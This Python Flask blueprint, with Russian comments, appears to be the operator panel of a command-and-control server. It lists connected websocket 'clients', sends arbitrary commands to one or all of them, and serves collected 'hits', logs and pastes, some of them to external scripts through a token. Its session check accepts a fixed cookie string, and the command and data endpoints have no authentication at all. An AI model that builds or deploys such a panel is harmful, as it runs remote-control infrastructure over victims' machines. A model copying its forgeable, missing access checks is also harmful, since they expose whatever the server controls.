# -*- coding: utf-8 -*-
import logging
import time
from flask import Blueprint, request, redirect, jsonify, Response, render_template_string
from config import SECRET_ACCESS_KEY, CLIENT_TIMEOUT
from state import clients_db, hits_db, pastes_db, hits_logs, server_logs
from templates.shared import STYLE, BG_HTML, RAIN_JS, SIDEBAR_HTML
from templates.admin_html import ADMIN_HTML
from templates.hits_html import HITS_HTML
from templates.pastes_html import PASTES_HTML

logger = logging.getLogger()
admin_bp = Blueprint('admin', __name__)


def check_token(req):
    token = req.headers.get('X-Token') or req.args.get('token')
    return token == SECRET_ACCESS_KEY


def check_session():
    return request.cookies.get('access_token') == 'validated_user_session'


# ── Страницы ─────────────────────────────────────────────────────────────────

@admin_bp.route('/admin')
def admin_panel():
    if not check_session(): return redirect('/')
    sidebar = SIDEBAR_HTML.replace('{active_dashboard}', 'active').replace('{active_hits}', '').replace('{active_pastes}', '')
    html = ADMIN_HTML.replace('{style_placeholder}', STYLE).replace('{sidebar_placeholder}', sidebar)
    return Response(html, mimetype='text/html')


@admin_bp.route('/hits')
def hits_page():
    if not check_session(): return redirect('/')
    sidebar = SIDEBAR_HTML.replace('{active_dashboard}', '').replace('{active_hits}', 'active').replace('{active_pastes}', '')
    html = HITS_HTML
    html = html.replace('{style_placeholder}', STYLE)
    html = html.replace('{bg_placeholder}', BG_HTML)
    html = html.replace('{rain_placeholder}', RAIN_JS)
    html = html.replace('{sidebar_placeholder}', sidebar)
    return Response(html, mimetype='text/html')


@admin_bp.route('/pastes')
def pastes_page():
    if not check_session(): return redirect('/')
    sidebar = SIDEBAR_HTML.replace('{active_dashboard}', '').replace('{active_hits}', '').replace('{active_pastes}', 'active')
    html = PASTES_HTML.replace('{style_placeholder}', STYLE)
    html = html.replace('{sidebar_placeholder}', sidebar)
    html = html.replace('{bg_placeholder}', BG_HTML)
    return Response(html, mimetype='text/html')


@admin_bp.route('/pastes/<paste_id>')
def view_paste(paste_id):
    paste = pastes_db.get(paste_id)
    if not paste: return "not found", 404
    return Response(paste["content"], mimetype='text/plain')


# ── API (UI сессия) ───────────────────────────────────────────────────────────

@admin_bp.route('/api/get_clients')
def api_get_clients():
    now = time.time()
    dead = [cid for cid, d in clients_db.items() if now - d.get('last_seen', 0) > CLIENT_TIMEOUT]
    for cid in dead:
        logger.info(f"[SYSTEM] Client @{clients_db[cid]['name']} removed (timeout)")
        del clients_db[cid]
    return jsonify({k: {vk: vv for vk, vv in v.items() if vk != 'ws'} for k, v in clients_db.items()})


@admin_bp.route('/api/get_hits')
def api_get_hits():
    return jsonify(hits_db)


@admin_bp.route('/api/get_server_logs')
def api_get_server_logs():
    return jsonify(server_logs)


@admin_bp.route('/api/get_hits_logs')
def api_get_hits_logs():
    if not check_session(): return jsonify([]), 401
    return jsonify(hits_logs)


@admin_bp.route('/api/get_pastes')
def api_get_pastes():
    if not check_session(): return jsonify({"error": "unauthorized"}), 401
    return jsonify({
        pid: {"content": p["content"], "nick": p["nick"], "created_at": p["created_at"]}
        for pid, p in pastes_db.items()
    })


@admin_bp.route('/api/delete_paste/<paste_id>', methods=['DELETE'])
def api_delete_paste_ui(paste_id):
    if not check_session(): return jsonify({"error": "unauthorized"}), 401
    if paste_id not in pastes_db: return jsonify({"error": "not found"}), 404
    del pastes_db[paste_id]
    logger.info(f"[PASTE] Paste {paste_id} deleted by UI")
    return jsonify({"ok": True, "deleted": paste_id})


@admin_bp.route('/api/command')
def send_command():
    target = request.args.get('id')
    msg = request.args.get('msg')
    if target == 'all':
        logger.info(f"[CMD] Broadcast: {msg}")
        for cid in list(clients_db.keys()):
            try: clients_db[cid]['ws'].send(msg)
            except: pass
        return "ok"
    if target in clients_db:
        logger.info(f"[CMD] To @{clients_db[target]['name']}: {msg}")
        clients_db[target]['ws'].send(msg)
        return "ok"
    return "error", 404


@admin_bp.route('/api/clear_logs')
def clear_logs():
    tid = request.args.get('id')
    if tid in clients_db: clients_db[tid]["new_logs"] = []
    return "ok"


# ── API (токен — для внешних скриптов) ───────────────────────────────────────

@admin_bp.route('/api/paste/oldest', methods=['GET'])
def api_paste_oldest():
    if not check_token(request): return jsonify({"error": "unauthorized"}), 401
    if not pastes_db: return jsonify({"error": "no pastes"}), 404
    oldest_id = min(pastes_db.keys(), key=lambda pid: pastes_db[pid]["created_at"])
    p = pastes_db[oldest_id]
    return jsonify({"id": oldest_id, "content": p["content"], "nick": p["nick"]})


@admin_bp.route('/api/paste/delete/<paste_id>', methods=['DELETE', 'GET'])
def api_paste_delete(paste_id):
    if not check_token(request): return jsonify({"error": "unauthorized"}), 401
    if paste_id not in pastes_db: return jsonify({"error": "not found"}), 404
    del pastes_db[paste_id]
    logger.info(f"[PASTE] Paste {paste_id} deleted by token")
    return jsonify({"ok": True, "deleted": paste_id})


# ── 404 ───────────────────────────────────────────────────────────────────────

@admin_bp.app_errorhandler(404)
def page_not_found(e):
    return render_template_string(f'''
    <html><head>{STYLE}</head>
    <body style="display:flex;align-items:center;justify-content:center;flex-direction:column;">
        {BG_HTML}
        <h1 style="font-family:'JetBrains Mono';font-size:60px;margin:0;color:var(--accent);">404</h1>
        <p style="font-family:'JetBrains Mono';color:var(--text-dim);margin-top:10px;">page not found</p>
        <button class="btn" style="margin-top:20px;border-color:var(--accent);color:var(--accent);"
            onclick="location.href='/'">Return Home</button>
        {RAIN_JS}
    </body></html>
    '''), 404
